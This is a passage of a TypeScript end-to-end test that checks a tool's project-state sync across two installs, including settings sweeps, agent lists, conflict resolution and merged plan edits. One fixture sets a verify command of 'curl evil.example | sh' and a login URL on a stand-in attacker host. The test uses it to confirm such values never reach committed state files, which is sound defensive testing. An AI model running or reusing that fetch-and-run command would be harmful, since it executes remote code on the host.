    for (const name of ['sweep-kit', 'blocked-kit', 'merge-kit', 'gate-kit'])
      await dropBundle(name);
    const removed = await sweepDirtyProjectStates(a.db);
    const left = git(a.repoPath, 'status', '--porcelain');
    check(
      'deleting the bundles and one tick takes their descriptors back out',
      removed === 1 && left === '' && (await clean()),
      { removed, left: left.split('\n') },
    );

    await markProjectStatesDirtyAtBoot(a.db);
    const booted = await outboxA();
    await markProjectStatesDirtyAtBoot(a.db);
    check(
      'a boot marks a repository with a render context dirty, and a row still dirty once',
      booted !== null &&
        !(await clean()) &&
        (await outboxA())?.revision === booted.revision &&
        (await sweepDirtyProjectStates(a.db)) === 1 &&
        (await clean()) &&
        git(a.repoPath, 'status', '--porcelain') === '',
      { booted, now: await outboxA() },
    );

    // ---- the settings follow the columns through the sweep (B1.8b) ---------------------------
    const scopeRel = '.haive-data/state/settings/scope-exclude-globs.json';
    const setScope = async (globs: string[] | null) => {
      await a.db.transaction(async (tx) => {
        await tx
          .update(schema.repositories)
          .set({ scopeExcludeGlobs: globs, updatedAt: new Date() })
          .where(eq(schema.repositories.id, a.repositoryId));
        await markProjectStateDirty(tx, a.repositoryId);
      });
    };
    await setScope(['web/core', 'vendor']);
    check(
      'a scope list stored and marked, one sweep tick writes settings/scope-exclude-globs.json to the column',
      (await sweepDirtyProjectStates(a.db)) === 1 &&
        (await diskText(scopeRel)) === '[\n  "vendor",\n  "web/core"\n]\n' &&
        (await clean()),
      { file: await diskText(scopeRel), outbox: await outboxA() },
    );
    check(
      'and it is the only change in the checkout',
      git(a.repoPath, 'status', '--porcelain') === `M ${scopeRel}`,
      git(a.repoPath, 'status', '--porcelain').split('\n'),
    );
    await setScope(null);
    check(
      'a scope list cleared and marked, the next tick takes its file back out',
      (await sweepDirtyProjectStates(a.db)) === 1 &&
        (await diskText(scopeRel)) === null &&
        git(a.repoPath, 'status', '--porcelain') === `D ${scopeRel}`,
      git(a.repoPath, 'status', '--porcelain').split('\n'),
    );
    await setScope(columnsA!.scopeExcludeGlobs);
    check(
      'and the list back as it was leaves the checkout clean',
      (await sweepDirtyProjectStates(a.db)) === 1 &&
        git(a.repoPath, 'status', '--porcelain') === '',
      git(a.repoPath, 'status', '--porcelain').split('\n'),
    );
    await a.db.transaction(async (tx) => {
      await tx
        .update(schema.repositories)
        .set({
          appAuth: {
            enabled: true,
            loginUrl: 'https://evil.example/login',
            usernameSelector: '#u',
            passwordSelector: '#p',
            submitSelector: '#s',
            successCondition: { type: 'url_contains', value: '/home' },
          },
          verifyCommands: { test: 'curl evil.example | sh' },
        })
        .where(eq(schema.repositories.id, a.repositoryId));
      await markProjectStateDirty(tx, a.repositoryId);
    });
    await sweepDirtyProjectStates(a.db);
    const stateFiles = (
      await readdir(path.join(a.repoPath, '.haive-data/state'), { recursive: true })
    ).map(String);
    const stateText = (
      await Promise.all(
        stateFiles.map((rel) =>
          readFile(path.join(a.repoPath, '.haive-data/state', rel), 'utf8').catch(() => ''),
        ),
      )
    ).join('\n');
    check(
      'the app login and the verify commands never reach the record',
      !/evil\.example/.test(stateText) && !stateFiles.some((f) => /app-auth|verify/.test(f)),
      stateFiles,
    );
    await a.db
      .update(schema.repositories)
      .set({ appAuth: null, verifyCommands: null })
      .where(eq(schema.repositories.id, a.repositoryId));

    // ---- a teammate's render change reaches a repository with claims (B1.4d) ----------------
    // The seed clone pulls A's commit and commits a record that adds an agent A did not accept and
    // drops one it did, and each install refreshes onto it. It goes last: the checkout moves, which
    // the clean-checkout check above must not see.
    const acceptedA = (contextA?.acceptedAgentIds ?? []) as string[];
    const newAgent =
      [...BASELINE_AGENT_SPECS, ...Object.values(FRAMEWORK_AGENT_SPECS).flat()].find(
        (spec) => !acceptedA.includes(spec.id),
      )?.id ?? null;
    check(
      'a baseline or framework agent is left for a teammate to add',
      newAgent !== null,
      acceptedA,
    );
    const droppedAgent =
      BASELINE_AGENT_SPECS.find(
        (spec) => spec.id !== 'code-reviewer' && acceptedA.includes(spec.id),
      )?.id ?? null;
    check('and one A accepted is left for a teammate to drop', droppedAgent !== null, acceptedA);
    const droppedRows = await a.db
      .select({
        diskPath: schema.onboardingArtifacts.diskPath,
        writtenHash: schema.onboardingArtifacts.writtenHash,
      })
      .from(schema.onboardingArtifacts)
      .where(
        and(
          eq(schema.onboardingArtifacts.repositoryId, a.repositoryId),
          eq(schema.onboardingArtifacts.templateId, `agent.${droppedAgent}`),
          isNull(schema.onboardingArtifacts.supersededAt),
        ),
      );
    check('and A claims at least one file of it', droppedRows.length > 0, droppedRows);
    git(seed, 'pull', '-q', '--ff-only', 'origin', 'main');
    if (contextA !== null && newAgent !== null && droppedAgent !== null) {
      const teamRecord = recordOf({
        ...contextA,
        acceptedAgentIds: [...acceptedA.filter((id) => id !== droppedAgent), newAgent],
      });
      for (const [rel, text] of renderProjectState(teamRecord)) {
        const abs = path.join(seed, '.haive-data/state', rel);
        await mkdir(path.dirname(abs), { recursive: true });
        await writeFile(abs, text);
      }
      git(seed, 'add', '.haive-data/state');
      git(seed, 'commit', '-q', '-m', 'a teammate swaps an agent');
      git(seed, 'push', '-q', 'origin', 'HEAD:main');
    }
    const refresh = (install: Install, storage: string) =>
      handleRefresh(
        {
          repositoryId: install.repositoryId,
          userId: install.userId,
          source: 'git_https',
          remoteUrl,
          branch: 'main',
        },
        install.db,
        path.join(tmp!, storage),
      );
    const repoStateOf = (install: Install) =>
      rowsOf<{
        render_context: { acceptedAgentIds?: string[] } | null;
        applicable_template_ids: string[] | null;
        status_message: string | null;
      }>(
        install.db,
        sql`select render_context, applicable_template_ids, status_message from repositories where id = ${install.repositoryId}`,
      );

    await refresh(a, 'storage-a');
    const refreshedA = await repoStateOf(a);
    const setA =
      'rows' in refreshedA ? (refreshedA.rows[0]?.applicable_template_ids ?? null) : null;
    const nextPlan = await upgradePlan(a);
    if (nextPlan.plan !== null) {
      await upgradePlanStep.apply(ctxFor(a, nextPlan.taskId, nextPlan.stepId), {
        detected: nextPlan.plan,
        formValues: {},
        iteration: 0,
        previousIterations: [],
      });
    }
    await a.db
      .update(schema.tasks)
      .set({ status: 'completed', completedAt: new Date() })
      .where(eq(schema.tasks.id, nextPlan.taskId));
    const plannedA = await repoStateOf(a);
    const setAfterPlanA =
      'rows' in plannedA ? (plannedA.rows[0]?.applicable_template_ids ?? null) : null;
    check(
      "K5': after a refresh A's applicable set holds the agent a teammate's record added and not the one it dropped, and is the set A's own plan writes",
      newAgent !== null &&
        setA !== null &&
        setA.includes(`agent.${newAgent}`) &&
        !setA.includes(`agent.${droppedAgent}`) &&
        isDeepStrictEqual(setA, setAfterPlanA),
      { newAgent, droppedAgent, setA, setAfterPlanA, refreshed: refreshedA },
    );
    const droppedState = await Promise.all(
      droppedRows.map(async (row) => ({
        diskPath: row.diskPath,
        bucket: nextPlan.plan?.entries.find((e) => e.diskPath === row.diskPath)?.bucket ?? null,
        holdsRecordedBytes:
          sha256Hex(
            normalizeContent(
              await readFile(path.join(a.repoPath, row.diskPath), 'utf8').catch(() => ''),
            ),
          ) === row.writtenHash,
      })),
    );
    check(
      "K5': A's plan offers each file of the agent the record dropped as obsolete, each still holding what its row records",
      droppedState.length > 0 &&
        droppedState.every((f) => f.bucket === 'obsolete' && f.holdsRecordedBytes),
      droppedState,
    );

    // A upgrades onto the teammate's record: 02 removes the files of the agent it dropped and writes
    // those of the one it added, and A commits and pushes the result.
    const removedPaths = droppedRows.map((row) => row.diskPath);
    const upgradedA = await upgradeApplied(a, (planned) => ({
      selectedObsoleteRemovals: planned.entries
        .filter((e) => e.bucket === 'obsolete' && removedPaths.includes(e.diskPath))
        .map((e) => e.entryId),
    }));
    check('A upgrades onto the teammate record', upgradedA.error === null, upgradedA.error);
    const liveAfterA = await livePaths(a);
    check(
      "A's upgrade retires the rows of the dropped agent and claims the added one's files",
      removedPaths.every((p) => !liveAfterA.includes(p)) &&
        liveAfterA.some((p) => p.includes(String(newAgent))),
      { removedPaths, liveAfterA },
    );
    const upgradedStateA = await repoStateOf(a);
    const setAfterUpgradeA =
      'rows' in upgradedStateA ? (upgradedStateA.rows[0]?.applicable_template_ids ?? null) : null;
    const scopeEdited = [...globs, 'e2e-fresh/**'].sort();
    await setScope(scopeEdited);
    await sweepDirtyProjectStates(a.db);
    check(
      "A's sweep brings the exclusion list it edited into the record",
      isDeepStrictEqual(JSON.parse((await diskText(scopeRel)) ?? 'null'), scopeEdited),
      await diskText(scopeRel),
    );
    git(a.repoPath, 'add', '-A');
    git(a.repoPath, 'commit', '-q', '-m', 'A upgrades');
    git(a.repoPath, 'push', '-q', 'origin', 'HEAD:main');

    // B follows both the teammate's record and A's upgrade. Its ledger moves with A's: the rows of the
    // dropped agent are retired, the added agent's are imported, and its set is the one A's 02 wrote. The
    // upgrade task the plan above opened for B is cancelled first: a live one makes the sync defer.
    await b.db
      .update(schema.tasks)
      .set({ status: 'cancelled' })
      .where(eq(schema.tasks.id, upgradeB.taskId));
    await refresh(b, 'storage-b');
    const refreshedB = await repoStateOf(b);
    const rowB = 'rows' in refreshedB ? refreshedB.rows[0] : undefined;
    check(
      "B's applicable set equals the one A's 02 wrote while its render_context takes the teammate's agent",
      newAgent !== null &&
        rowB !== undefined &&
        rowB.applicable_template_ids !== null &&
        setAfterUpgradeA !== null &&
        isDeepStrictEqual(rowB.applicable_template_ids, setAfterUpgradeA) &&
        rowB.applicable_template_ids.includes(`agent.${newAgent}`) &&
        (rowB.render_context?.acceptedAgentIds ?? []).includes(newAgent),
      { refreshedB, setA, setAfterUpgradeA },
    );
    const scopeOnB = await rowsOf<{ scope_exclude_globs: string[] | null }>(
      b.db,
      sql`select scope_exclude_globs from repositories where id = ${b.repositoryId}`,
    );
    check(
      "B's exclusion list equals the one A edited, A's sweep wrote and A pushed",
      'rows' in scopeOnB && isDeepStrictEqual(scopeOnB.rows[0]?.scope_exclude_globs, scopeEdited),
      scopeOnB,
    );
    const pathsAfterB = await livePaths(b);
    check(
      "after A's upgrade B holds the claims A holds, and no live row for the agent A removed",
      isDeepStrictEqual(pathsAfterB, liveAfterA) &&
        removedPaths.every((p) => !pathsAfterB.includes(p)),
      { a: liveAfterA, b: pathsAfterB },
    );
    const retiredOnB = await rowsOf<{ disk_path: string; imported_at: Date | null }>(
      b.db,
      sql`select disk_path, imported_at from onboarding_artifacts where repository_id = ${b.repositoryId} and superseded_at is not null`,
    );
    check(
      'and the rows it retired are stamped as the import retired them',
      'rows' in retiredOnB &&
        removedPaths.every((p) =>
          retiredOnB.rows.some((r) => r.disk_path === p && r.imported_at !== null),
        ),
      retiredOnB,
    );
    const afterUpgradeB = await upgradePlan(b);
    await b.db
      .update(schema.tasks)
      .set({ status: 'cancelled' })
      .where(eq(schema.tasks.id, afterUpgradeB.taskId));
    const notUnchangedAfter = afterUpgradeB.plan?.entries
      .filter((e) => e.bucket !== 'unchanged')
      .map((e) => `${e.diskPath}: ${e.bucket}`);
    check(
      "after A's upgrade B's plan reads every path as unchanged, and offers none of the removed agent's",
      afterUpgradeB.plan !== null &&
        afterUpgradeB.plan.entries.length > 0 &&
        notUnchangedAfter!.length === 0 &&
        !afterUpgradeB.plan.entries.some((e) => removedPaths.includes(e.diskPath)),
      afterUpgradeB.error ?? notUnchangedAfter,
    );
    // What GET /repos/:id/upgrade-status compares: the template ids of the live rows against the set.
    const installedB = await rowsOf<{ template_id: string }>(
      b.db,
      sql`select distinct template_id from onboarding_artifacts where repository_id = ${b.repositoryId} and superseded_at is null`,
    );
    const setB = rowB?.applicable_template_ids ?? [];
    const installedIds = 'rows' in installedB ? installedB.rows.map((r) => r.template_id) : [];
    check(
      "B's upgrade status offers no upgrade: nothing in its set is missing from its ledger",
      installedIds.length > 0 && setB.filter((id) => !installedIds.includes(id)).length === 0,
      {
        missing: setB.filter((id) => !installedIds.includes(id)),
        outside: installedIds.filter((id) => !setB.includes(id)),
      },
    );

    // ---- both installs change one setting: a pending conflict, asked and never chosen (B1.5a) ----
    // A and B each change the accepted agents, differently, from the record both hold. B keeps its
    // own value in the column, the checkout's file keeps A's, a writer on B does not settle it, and
    // no upgrade starts until somebody answers.
    const baseIds = rowB?.render_context?.acceptedAgentIds ?? [];
    const extraAgent =
      [...BASELINE_AGENT_SPECS, ...Object.values(FRAMEWORK_AGENT_SPECS).flat()].find(
        (spec) => !baseIds.includes(spec.id),
      )?.id ?? null;
    const cutAgent =
      BASELINE_AGENT_SPECS.find((spec) => spec.id !== 'code-reviewer' && baseIds.includes(spec.id))
        ?.id ?? null;
    check(
      'an agent is left for B to add and one for A to drop',
      extraAgent !== null && cutAgent !== null,
      baseIds,
    );
    if (extraAgent !== null && cutAgent !== null) {
      const idsB = [...baseIds, extraAgent];
      const idsA = baseIds.filter((id) => id !== cutAgent);
      const planA = await upgradePlan(a);
      await a.db
        .update(schema.tasks)
        .set({ status: 'cancelled' })
        .where(eq(schema.tasks.id, planA.taskId));
      check('A plans from its render context', planA.plan !== null, planA.error);
      if (planA.plan !== null) {
        await writeProjectStateRecord(a.db, {
          repositoryId: a.repositoryId,
          repoPath: a.repoPath,
          context: { ...planA.plan.renderCtxSnapshot, acceptedAgentIds: idsA } as never,
          rtkChoiceRecorded: true,
        });
        git(a.repoPath, 'add', '.haive-data/state');
        git(a.repoPath, 'commit', '-q', '-m', 'A drops an agent');
        git(a.repoPath, 'push', '-q', 'origin', 'HEAD:main');
      }
      await b.db.execute(
        sql`update repositories set render_context = jsonb_set(render_context, '{acceptedAgentIds}', ${JSON.stringify(idsB)}::jsonb) where id = ${b.repositoryId}`,
      );

      await refresh(b, 'storage-b');

      const renderUnit = 'project/render.json#acceptedAgentIds';
      // Keep closed rows: the answer checks below inspect history as well as the pending question.
      const renderQuestionsOf = (install: Install) =>
        rowsOf<{
          id: string;
          unit: string;
          base: { v: unknown } | null;
          local: { v: unknown } | null;
          incoming: { v: unknown } | null;
          resolved_at: Date | null;
          resolution: string | null;
        }>(
          install.db,
          sql`select id, unit, base, local, incoming, resolved_at, resolution from project_state_conflicts where repository_id = ${install.repositoryId} and unit = ${renderUnit} order by detected_at, id`,
        );
      const rtkHistory = await rowsOf<{
        id: string;
        base: { v: unknown } | null;
        local: { v: unknown } | null;
        incoming: { v: unknown } | null;
        resolved_at: Date | null;
        resolution: string | null;
      }>(
        b.db,
        sql`select id, base, local, incoming, resolved_at, resolution from project_state_conflicts
          where repository_id = ${b.repositoryId} and unit = 'settings/rtk-enabled.json'`,
      );
      check(
        'B retains the RTK question converged by its imported choice as closed history',
        'rows' in rtkHistory &&
          rtkHistory.rows.length === 1 &&
          rtkHistory.rows[0]!.resolution === 'converged' &&
          rtkHistory.rows[0]!.resolved_at !== null &&
          isDeepStrictEqual(rtkHistory.rows[0]!.base, { v: true }) &&
          isDeepStrictEqual(rtkHistory.rows[0]!.local, { v: true }) &&
          isDeepStrictEqual(rtkHistory.rows[0]!.incoming, { v: false }),
        rtkHistory,
      );
      const pendingUnitsOf = (install: Install) =>
        rowsOf<{ unit: string }>(
          install.db,
          sql`select unit from project_state_conflicts where repository_id = ${install.repositoryId}
            and resolved_at is null order by unit`,
        );
      const checkPendingUnits = async (name: string, install: Install, expected: string[]) => {
        const pending = await pendingUnitsOf(install);
        check(
          name,
          'rows' in pending &&
            isDeepStrictEqual(
              pending.rows.map((r) => r.unit),
              expected,
            ),
          pending,
        );
      };
      await checkPendingUnits(
        'B holds no pending question outside the render setting both changed',
        b,
        [renderUnit],
      );
      const pendingB = await renderQuestionsOf(b);
      const row = 'rows' in pendingB && pendingB.rows.length === 1 ? pendingB.rows[0]! : null;
      check(
        'B holds one pending conflict for the setting both changed, with the base, its value and A’s',
        row !== null &&
          row.unit === 'project/render.json#acceptedAgentIds' &&
          row.resolved_at === null &&
          isDeepStrictEqual(sorted(row.base?.v), sorted(baseIds)) &&
          isDeepStrictEqual(sorted(row.local?.v), sorted(idsB)) &&
          isDeepStrictEqual(sorted(row.incoming?.v), sorted(idsA)),
        pendingB,
      );
      const columnNow = await repoStateOf(b);
      check(
        "and B's own value stays in its render_context",
        'rows' in columnNow &&
          isDeepStrictEqual(
            sorted(columnNow.rows[0]?.render_context?.acceptedAgentIds),
            sorted(idsB),
          ),
        columnNow,
      );
      const onB = async (rel: string) =>
        readFile(path.join(b.repoPath, rel), 'utf8').then(
          (text) => text,
          () => null,
        );
      const fileOnB = JSON.parse((await onB(RECORD_RENDER)) ?? 'null') as {
        acceptedAgentIds?: string[];
      } | null;
      check(
        "B's checkout keeps A's value in project/render.json",
        isDeepStrictEqual(sorted(fileOnB?.acceptedAgentIds), sorted(idsA)),
        fileOnB?.acceptedAgentIds,
      );

      // A writer on B (what 02 does) renders from B's column and must not settle the conflict.
      const writerPlan = await upgradePlan(b);
      await b.db
        .update(schema.tasks)
        .set({ status: 'cancelled' })
        .where(eq(schema.tasks.id, writerPlan.taskId));
      if (writerPlan.plan !== null) {
        await writeProjectStateRecord(b.db, {
          repositoryId: b.repositoryId,
          repoPath: b.repoPath,
          context: writerPlan.plan.renderCtxSnapshot as never,
          rtkChoiceRecorded: true,
        });
      }
      const afterWrite = JSON.parse((await onB(RECORD_RENDER)) ?? 'null') as {
        acceptedAgentIds?: string[];
      } | null;
      const baseAfter = await rowsOf<{
        base_snapshot: { render?: { acceptedAgentIds?: string[] } };
      }>(
        b.db,
        sql`select base_snapshot from project_state_sync where repository_id = ${b.repositoryId}`,
      );
      const columnAfter = await repoStateOf(b);
      check(
        "a writer on B leaves A's value in the file, the old base for it, and B's value in the column",
        writerPlan.plan !== null &&
          isDeepStrictEqual(sorted(afterWrite?.acceptedAgentIds), sorted(idsA)) &&
          'rows' in baseAfter &&
          isDeepStrictEqual(
            sorted(baseAfter.rows[0]?.base_snapshot.render?.acceptedAgentIds),
            sorted(baseIds),
          ) &&
          'rows' in columnAfter &&
          isDeepStrictEqual(
            sorted(columnAfter.rows[0]?.render_context?.acceptedAgentIds),
            sorted(idsB),
          ),
        { plan: writerPlan.error, afterWrite, baseAfter, columnAfter },
      );
      await checkPendingUnits('B’s writer leaves only the same render question pending', b, [
        renderUnit,
      ]);
      const again = await syncProjectStateFromCheckout(b.db, {
        repositoryId: b.repositoryId,
        repoPath: b.repoPath,
      });
      await checkPendingUnits('B’s repeated sync leaves only the same render question pending', b, [
        renderUnit,
      ]);
      const stillPending = await renderQuestionsOf(b);
      check(
        'and the next sync meets the same conflict, with no second row',
        again.outcome === 'conflict' &&
          'rows' in stillPending &&
          stillPending.rows.length === 1 &&
          stillPending.rows[0]!.id === row?.id &&
          stillPending.rows[0]!.resolved_at === null,
        { again, stillPending },
      );

      const [repoRowB] = await b.db
        .select({
          id: schema.repositories.id,
          source: schema.repositories.source,
          renderContext: schema.repositories.renderContext,
          status: schema.repositories.status,
          storagePath: schema.repositories.storagePath,
          localPath: schema.repositories.localPath,
          onboardedAt: schema.repositories.onboardedAt,
          onboardingResetAt: schema.repositories.onboardingResetAt,
        })
        .from(schema.repositories)
        .where(eq(schema.repositories.id, b.repositoryId));
      const admission = repoRowB ? await upgradeAdmission(b.db, b.userId, repoRowB) : null;
      check(
        'an upgrade on B is refused while the conflict is pending, naming it',
        admission !== null &&
          !admission.admitted &&
          admission.reason === 'contested' &&
          isDeepStrictEqual(admission.units, ['project/render.json#acceptedAgentIds']),
        admission,
      );
      const noConflictOnA = await pendingUnitsOf(a);
      check(
        'and A, whose value stands, holds none',
        'rows' in noConflictOnA && noConflictOnA.rows.length === 0,
        noConflictOnA,
      );

      // ---- B answers: take A's value, then a second round where B keeps its own (B1.5b) ----------
      const admissionOf = async () => {
        const [r] = await b.db
          .select({
            id: schema.repositories.id,
            source: schema.repositories.source,
            renderContext: schema.repositories.renderContext,
            status: schema.repositories.status,
            storagePath: schema.repositories.storagePath,
            localPath: schema.repositories.localPath,
            onboardedAt: schema.repositories.onboardedAt,
            onboardingResetAt: schema.repositories.onboardingResetAt,
          })
          .from(schema.repositories)
          .where(eq(schema.repositories.id, b.repositoryId));
        return r ? upgradeAdmission(b.db, b.userId, r) : null;
      };
      const baseIdsOf = async (install: Install) => {
        const base = await rowsOf<{ base_snapshot: { render?: { acceptedAgentIds?: string[] } } }>(
          install.db,
          sql`select base_snapshot from project_state_sync where repository_id = ${install.repositoryId}`,
        );
        return 'rows' in base ? base.rows[0]?.base_snapshot.render?.acceptedAgentIds : undefined;
      };
      const fileIdsOn = async (install: Install) =>
        (
          JSON.parse(
            await readFile(path.join(install.repoPath, RECORD_RENDER), 'utf8').catch(() => 'null'),
          ) as { acceptedAgentIds?: string[] } | null
        )?.acceptedAgentIds;

      const takeId = row?.id ?? '';
      const taken = await resolveProjectStateConflict(b.db, {
        repositoryId: b.repositoryId,
        userId: b.userId,
        conflictId: takeId,
        answer: 'take_theirs',
      });
      const afterTake = await renderQuestionsOf(b);
      const columnTaken = await repoStateOf(b);
      const admittedAfterTake = await admissionOf();
      const syncAfterTake = await syncProjectStateFromCheckout(b.db, {
        repositoryId: b.repositoryId,
        repoPath: b.repoPath,
      });
      await checkPendingUnits('B has no pending unit after taking theirs and syncing', b, []);
      check(
        "B answers take theirs: the row is closed, the column holds A's value, the file and the base agree",
        taken.kind === 'resolved' &&
          taken.written.length === 0 &&
          'rows' in afterTake &&
          afterTake.rows.length === 1 &&
          afterTake.rows[0]!.id === takeId &&
          afterTake.rows[0]!.resolved_at !== null &&
          afterTake.rows[0]!.resolution === 'take_theirs' &&
          'rows' in columnTaken &&
          isDeepStrictEqual(
            sorted(columnTaken.rows[0]?.render_context?.acceptedAgentIds),
            sorted(idsA),
          ) &&
          isDeepStrictEqual(sorted(await fileIdsOn(b)), sorted(idsA)) &&
          isDeepStrictEqual(sorted(await baseIdsOf(b)), sorted(idsA)),
        { taken, afterTake, columnTaken },
      );
      check(
        'and an upgrade on B is no longer held for it, and the next sync finds nothing to ask',
        admittedAfterTake !== null &&
          !(!admittedAfterTake.admitted && admittedAfterTake.reason === 'contested') &&
          syncAfterTake.outcome === 'unchanged',
        { admittedAfterTake, syncAfterTake },
      );
      const repeated = await resolveProjectStateConflict(b.db, {
        repositoryId: b.repositoryId,
        userId: b.userId,
        conflictId: takeId,
        answer: 'take_theirs',
      });
      const flipped = await resolveProjectStateConflict(b.db, {
        repositoryId: b.repositoryId,
        userId: b.userId,
        conflictId: takeId,
        answer: 'keep_mine',
      });
      check(
        'the same answer again returns the closed row, and the other answer is refused as settled',
        repeated.kind === 'resolved' && repeated.written.length === 0 && flipped.kind === 'settled',
        { repeated, flipped },
      );

      await checkPendingUnits('B’s repeated and refused answers open no pending unit', b, []);

      const cutAgent2 =
        BASELINE_AGENT_SPECS.find(
          (spec) => spec.id !== 'code-reviewer' && spec.id !== cutAgent && idsA.includes(spec.id),
        )?.id ?? null;
      const extraAgent2 =
        [...BASELINE_AGENT_SPECS, ...Object.values(FRAMEWORK_AGENT_SPECS).flat()].find(
          (spec) => !baseIds.includes(spec.id) && spec.id !== extraAgent,
        )?.id ?? null;
      check(
        'a second agent is left for each side to change again',
        cutAgent2 !== null && extraAgent2 !== null,
        idsA,
      );
      if (cutAgent2 !== null && extraAgent2 !== null && planA.plan !== null) {
        const idsA2 = idsA.filter((id) => id !== cutAgent2);
        const idsB2 = [...idsA, extraAgent2];
        await writeProjectStateRecord(a.db, {
          repositoryId: a.repositoryId,
          repoPath: a.repoPath,
          context: { ...planA.plan.renderCtxSnapshot, acceptedAgentIds: idsA2 } as never,
          rtkChoiceRecorded: true,
        });
        git(a.repoPath, 'add', '.haive-data/state');
        git(a.repoPath, 'commit', '-q', '-m', 'A drops a second agent');
        git(a.repoPath, 'push', '-q', 'origin', 'HEAD:main');
        await b.db.execute(
          sql`update repositories set render_context = jsonb_set(render_context, '{acceptedAgentIds}', ${JSON.stringify(idsB2)}::jsonb) where id = ${b.repositoryId}`,
        );
        await refresh(b, 'storage-b');
        await checkPendingUnits(
          'B’s second refresh leaves only the new render question pending',
          b,
          [renderUnit],
        );
        const second = await renderQuestionsOf(b);
        const open = 'rows' in second ? second.rows.find((r) => r.resolved_at === null) : undefined;
        check(
          'the same setting changed again on both sides opens a new question',
          'rows' in second &&
            second.rows.length === 2 &&
            second.rows.some(
              (r) => r.id === takeId && r.resolution === 'take_theirs' && r.resolved_at !== null,
            ) &&
            open !== undefined &&
            open.id !== takeId &&
            isDeepStrictEqual(sorted(open.base?.v), sorted(idsA)) &&
            isDeepStrictEqual(sorted(open.local?.v), sorted(idsB2)) &&
            isDeepStrictEqual(sorted(open.incoming?.v), sorted(idsA2)),
          second,
        );
        const kept = await resolveProjectStateConflict(b.db, {
          repositoryId: b.repositoryId,
          userId: b.userId,
          conflictId: open?.id ?? '',
          answer: 'keep_mine',
        });
        const columnKept = await repoStateOf(b);
        const syncAfterKeep = await syncProjectStateFromCheckout(b.db, {
          repositoryId: b.repositoryId,
          repoPath: b.repoPath,
        });
        await checkPendingUnits('B has no pending unit after keeping mine and syncing', b, []);
        check(
          "B answers keep mine: the column stays, B's value goes to the file and the base, and the next sync finds nothing",
          kept.kind === 'resolved' &&
            kept.written.length === 1 &&
            'rows' in columnKept &&
            isDeepStrictEqual(
              sorted(columnKept.rows[0]?.render_context?.acceptedAgentIds),
              sorted(idsB2),
            ) &&
            isDeepStrictEqual(sorted(await fileIdsOn(b)), sorted(idsB2)) &&
            isDeepStrictEqual(sorted(await baseIdsOf(b)), sorted(idsB2)) &&
            syncAfterKeep.outcome === 'unchanged',
          { kept, columnKept, syncAfterKeep },
        );
        git(b.repoPath, 'add', '.haive-data/state');
        git(b.repoPath, 'commit', '-q', '-m', 'B keeps its agents');
        git(b.repoPath, 'push', '-q', 'origin', 'HEAD:main');
        await refresh(a, 'storage-a');
        const columnA = await repoStateOf(a);
        const afterA = await pendingUnitsOf(a);
        const noneOnA = 'rows' in afterA && afterA.rows.length === 0;
        check(
          "A takes B's pushed answer on its next refresh and holds no conflict",
          'rows' in columnA &&
            isDeepStrictEqual(
              sorted(columnA.rows[0]?.render_context?.acceptedAgentIds),
              sorted(idsB2),
            ) &&
            noneOnA,
          columnA,
        );
      }
    }

    // ---- plan edits on both installs both survive (B2.2b) ---------------------------------
    const planFileRel = '.haive-data/plan.json';
    const planMdRel = '.haive-data/plan.md';
    const titlesOf = async (install: Install): Promise<string[]> =>
      (await planOf(install)).map((n) => n.title).sort();
    const nodesNow = await planOf(b);
    const onB = nodesNow.find((n) => n.title === 'Edited on B')!;
    const onA = nodesNow.find((n) => n.id !== onB.id && n.parentId !== null)!;
    await applyPlanPatch(
      a.db,
      { ops: [{ op: 'upsert', nodeRef: onA.id, title: 'Edited on A' }] },
      { repositoryId: a.repositoryId, origin: 'user' },
    );
    await writePlanMirror(a.db, a.repositoryId, a.repoPath);
    git(a.repoPath, 'add', planFileRel, planMdRel);
    git(a.repoPath, 'commit', '-q', '-m', 'A edits the plan');
    git(a.repoPath, 'push', '-q', 'origin', 'HEAD:main');
    await applyPlanPatch(
      b.db,
      { ops: [{ op: 'upsert', nodeRef: onB.id, title: 'Edited on B again' }] },
      { repositoryId: b.repositoryId, origin: 'user' },
    );
    await writePlanMirror(b.db, b.repositoryId, b.repoPath);
    git(b.repoPath, 'checkout', '--', planFileRel, planMdRel);
    git(b.repoPath, 'pull', '-q', '--ff-only', 'origin', 'main');
    const bBoth = await writePlanMirror(b.db, b.repositoryId, b.repoPath).then(
      (files) => files,
      (err: Error) => err.message,
    );
    const filePlanB = await readFile(path.join(b.repoPath, planFileRel), 'utf8');
    check(
      "B's write after a plain git pull of A's plan edit keeps both edits, in its database and in plan.json",
      Array.isArray(bBoth) &&
        (await titlesOf(b)).includes('Edited on A') &&
        (await titlesOf(b)).includes('Edited on B again') &&
        filePlanB.includes('Edited on A') &&
        filePlanB.includes('Edited on B again'),
      { bBoth, titles: await titlesOf(b) },
    );
    git(b.repoPath, 'add', planFileRel, planMdRel);
    git(b.repoPath, 'commit', '-q', '-m', 'B merges the plan');
    git(b.repoPath, 'push', '-q', 'origin', 'HEAD:main');
    git(a.repoPath, 'pull', '-q', '--ff-only', 'origin', 'main');
    const aBoth = await reconcilePlanFromCheckout(a.db, a.repositoryId, a.repoPath);
    check(
      "A reads B's merged plan and holds both edits",
      aBoth.skipped === null &&
        (await titlesOf(a)).includes('Edited on A') &&
        (await titlesOf(a)).includes('Edited on B again'),
      { aBoth, titles: await titlesOf(a) },
    );
    const askedOnA = await rowsOf<{ unit: string }>(
      a.db,
      sql`select unit from project_state_conflicts where unit like 'plan/%' and resolved_at is null`,
    );
    check(
      'and the two installs end with the same plan, nothing asked',
      isDeepStrictEqual(await titlesOf(a), await titlesOf(b)) &&
        'rows' in askedOnA &&
        askedOnA.rows.length === 0,
      askedOnA,
    );

    // ---- a switch made on the Tooling page travels (D19) ------------------------------------------
    // B's context predates RTK and its base never held the setting; A's committed record says off.
    const switchRel = '.haive-data/state/settings/rtk-enabled.json';
    const rtkOf = (install: Install) =>
      rowsOf<{ rtk_enabled: boolean; stamped: boolean }>(
        install.db,
        sql`select rtk_enabled, rtk_choice_made_at is not null as stamped from repositories where id = ${install.repositoryId}`,
      );
    const askedAbout = (install: Install) =>
      rowsOf<{ unit: string }>(
        install.db,
        sql`select unit from project_state_conflicts where repository_id = ${install.repositoryId} and unit = 'settings/rtk-enabled.json' and resolved_at is null`,
      );
    await b.db.execute(
      sql`update repositories set rtk_enabled = true, rtk_choice_made_at = now(),
        render_context = jsonb_set(render_context, '{rtkChoiceRecorded}', 'false')
        where id = ${b.repositoryId}`,
    );
    await b.db.execute(
      sql`update project_state_sync set base_snapshot = base_snapshot #- '{settings,rtk-enabled}'
        where repository_id = ${b.repositoryId}`,
    );
    await markProjectStateDirty(b.db, b.repositoryId);
    await sweepDirtyProjectStates(b.db);
